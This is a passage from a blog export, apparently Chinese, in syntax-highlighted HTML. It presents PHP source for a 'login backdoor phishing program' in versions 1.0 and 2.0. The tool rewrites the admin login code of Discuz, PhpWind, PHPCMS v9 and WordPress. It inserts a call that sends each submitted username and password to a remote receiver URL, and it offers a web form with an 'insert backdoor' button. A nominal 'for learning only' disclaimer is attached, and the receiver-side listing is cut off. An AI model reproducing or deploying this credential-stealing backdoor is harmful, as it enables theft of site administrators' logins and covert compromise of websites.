class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cmsCode</span> = switchCms(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$cmsCode</span>)){</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"string\">'没找到可用CMS或者BBS'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$relPath</span> = <span class=\"variable\">$webRoot</span>.<span class=\"variable\">$dir</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'path'</span>];</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_exists(<span class=\"variable\">$relPath</span>)){</div><div class=\"line\"> inSertPwdDoor(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'没有找到该文件路径：'</span>.<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div><div class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> &quot;-<span class=\"comment\">//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span></div><div class=\"line\">&lt;html xmlns=&quot;http:<span class=\"comment\">//www.w3.org/1999/xhtml&quot;&gt;</span></div><div class=\"line\">&lt;head&gt;</div><div class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-<span class=\"number\">8</span>&quot; /&gt;</div><div class=\"line\">&lt;title&gt;自动插入语句&lt;/title&gt;</div><div class=\"line\">&lt;style type=&quot;text/css&quot;&gt;</div><div class=\"line\">*{</div><div class=\"line\">font-size:<span class=\"number\">14</span>px;</div><div class=\"line\">line-height:<span class=\"number\">20</span>px;</div><div class=\"line\">}</div><div class=\"line\">div{</div><div class=\"line\"> width:<span class=\"number\">450</span>px;</div><div class=\"line\"> margin: <span class=\"number\">0</span>px auto;</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">&lt;/style&gt;</div><div class=\"line\">&lt;/head&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;body&gt;</div><div class=\"line\">&lt;div style=&quot;width:<span class=\"number\">600</span>px;margin: <span class=\"number\">0</span>px auto;padding-top: <span class=\"number\">50</span>px;padding-bottom: <span class=\"number\">50</span>px; border: <span class=\"number\">1</span>px <span class=\"comment\">#fff012 solid;&quot;&gt;</span></div><div class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V1<span class=\"number\">.0</span> &lt;/h2&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> 当前文件路径：&lt;?php <span class=\"keyword\">echo</span> <span class=\"keyword\">__FILE__</span>?&gt;&lt;br/&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"></div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;</div><div class=\"line\"> &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div style=&quot;text-align: left; color: red; margin-top:<span class=\"number\">20</span>px;&quot;&gt;消息：&lt;?php <span class=\"keyword\">echo</span> <span class=\"variable\">$error</span>;?&gt;&lt;/div&gt;</div><div class=\"line\">&lt;/form&gt;</div><div class=\"line\">&lt;/div&gt;</div><div class=\"line\">&lt;/body&gt;</div><div class=\"line\">&lt;/html&gt;</div></pre></td></tr></table></figure>\n\n<p>","_id":"b17w8n7z7elp131c","comments":true,"layout":"post","photos":[],"link":""},{"title":"登录后门钓鱼程序 V2.0","id":105,"date":1341417547000,"tags":["jkk1hzi0kjnqyh4p","x2oej1diwv58fip4","2191ch4on5ok5nco"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>此版本中相对1.0版本加入了接收端mysql存储支持。</p>\n<p>自动插入后门端加入dz和wordpress的支持</p>\n<p>代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 登录后门钓鱼程序 V2.0</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 功能介绍：</div><div class=\"line\"> * 本程序会根据所选cms和BBS系统自动插入钓鱼后门</div><div class=\"line\"> * 后续将完善支持PHP的主流的cms和bbs系统</div><div class=\"line\"> * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 作者： Return Blogs: www.creturn.com email:master@creturn.com</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> **/</div><div class=\"line\">error_reporting(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$rHost</span> = <span class=\"string\">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class=\"comment\">//定义接收地址</span></div><div class=\"line\"><span class=\"variable\">$pUname</span> = <span class=\"string\">'uname'</span>; <span class=\"comment\">//远程端接收用户名参数</span></div><div class=\"line\"><span class=\"variable\">$pPwd</span> = <span class=\"string\">'pwd'</span>; <span class=\"comment\">//定义远程接收密码参数</span></div><div class=\"line\"><span class=\"variable\">$error</span> = <span class=\"string\">''</span>;</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 插入代码</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inSertPwdDoor</span><span class=\"params\">(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$rHost</span>,<span class=\"variable\">$pUname</span>,<span class=\"variable\">$pPwd</span>;</div><div class=\"line\"> <span class=\"comment\">//读取用户名密码特制</span></div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'mothed'</span>] == <span class=\"string\">'post'</span>){</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"comment\">//获取插入代码</span></div><div class=\"line\"> <span class=\"variable\">$keyword</span> = <span class=\"variable\">$cmsCode</span>[<span class=\"string\">'keyword'</span>];</div><div class=\"line\"> <span class=\"variable\">$replace</span> = <span class=\"string\">'file_get_contents(&quot;'</span>.<span class=\"variable\">$rHostPath</span>.<span class=\"string\">'&quot;);'</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'bedeck'</span>].<span class=\"variable\">$keyword</span>;</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = file_get_contents(<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = str_replace(<span class=\"variable\">$keyword</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$loginPageContent</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_put_contents(<span class=\"variable\">$relPath</span>, <span class=\"variable\">$loginPageContent</span>)){</div><div class=\"line\"> tipAmessage(<span class=\"string\">'成功插入！'</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'插入失败！'</span>);</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tipAmessage</span><span class=\"params\">(<span class=\"variable\">$msg</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$error</span>;</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"variable\">$msg</span>;</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 各类cms登录标识码和文件路径</div><div class=\"line\"> *</div><div class=\"line\"> * $code说明：</div><div class=\"line\"> * $code['keyword'] 关键字，就是要插入代码的特征码</div><div class=\"line\"> * $code['bedeck'] 修饰符用来修正代码的外观</div><div class=\"line\"> * $code['uname'] 用户名变量名</div><div class=\"line\"> * $code['pwd'] 密码变量名</div><div class=\"line\"> * $code['mothed'] 密码提交方式：POST 或者 GET</div><div class=\"line\"> * $code['path'] 登录文件路径</div><div class=\"line\"> * 注意事项：</div><div class=\"line\"> * 由于登录口不同程序可能有多个登录方法，正常登录</div><div class=\"line\"> * 或者ajax或者第三方登录，所以登录点的关键词必须找准</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">switchCms</span><span class=\"params\">(<span class=\"variable\">$cmsName</span>)</span></span>{</div><div class=\"line\"> <span class=\"variable\">$code</span> = <span class=\"keyword\">array</span>();</div><div class=\"line\"> <span class=\"keyword\">switch</span> (<span class=\"variable\">$cmsName</span>) {</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpcmsV9'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'phpcms/modules/admin/index.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;showmessage(L(<span class=\"string\">'login_success'</span>),<span class=\"string\">'?m=admin&amp;c=index'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'dedecms'</span>:</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'dz'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'source/class/class_admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$cpgroupid</span> = DB::result_first&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpwind'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'admin/admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$REQUEST_URI</span> = trim(<span class=\"variable\">$REQUEST_URI</span>,<span class=\"string\">'?#'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_name'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'wordpress'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'wp-includes/user.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$user</span> = <span class=\"keyword\">new</span> WP_User(<span class=\"variable\">$userdata</span>-&gt;ID);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'log'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">default</span>:</div><div class=\"line\"> ;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"variable\">$code</span>;</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>] != <span class=\"string\">''</span>){</div><div class=\"line\"> <span class=\"variable\">$webRoot</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'DOCUMENT_ROOT'</span>]; <span class=\"comment\">//当前目录</span></div><div class=\"line\"> <span class=\"variable\">$dir</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cms</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cmsCode</span> = switchCms(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$cmsCode</span>)){</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"string\">'没找到可用CMS或者BBS'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$relPath</span> = <span class=\"variable\">$webRoot</span>.<span class=\"variable\">$dir</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'path'</span>];</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_exists(<span class=\"variable\">$relPath</span>)){</div><div class=\"line\"> inSertPwdDoor(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'没有找到该文件路径：'</span>.<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"doctype\">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span></div><div class=\"line\">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</div><div class=\"line\">&lt;head&gt;</div><div class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</div><div class=\"line\">&lt;title&gt;自动插入语句&lt;/title&gt;</div><div class=\"line\">&lt;style type=&quot;text/css&quot;&gt;</div><div class=\"line\">*{</div><div class=\"line\">font-size:14px;</div><div class=\"line\">line-height:20px;</div><div class=\"line\">}</div><div class=\"line\">div{</div><div class=\"line\"> width:450px;</div><div class=\"line\"> margin: 0px auto;</div><div class=\"line\">}</div><div class=\"line\">?&gt;</div><div class=\"line\">&lt;/style&gt;</div><div class=\"line\">&lt;/head&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;body&gt;</div><div class=\"line\">&lt;div style=&quot;width:600px;margin: 0px auto;padding-top: 50px;padding-bottom: 50px; border: 1px #fff012 solid;&quot;&gt;</div><div class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V2.0 &lt;/h2&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> 当前文件路径：&lt;?php echo __FILE__?&gt;&lt;br/&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label for=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label for=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label for=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label for=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label for=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"></div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;</div><div class=\"line\"> &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div style=&quot;text-align: left; color: red; margin-top:20px;&quot;&gt;消息：&lt;?php echo $error;?&gt;&lt;/div&gt;</div><div class=\"line\">&lt;/form&gt;</div><div class=\"line\">&lt;/div&gt;</div><div class=\"line\">&lt;/body&gt;</div><div class=\"line\">&lt;/html&gt;</div></pre></td></tr></table></figure>\n\n<p>接收端：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div 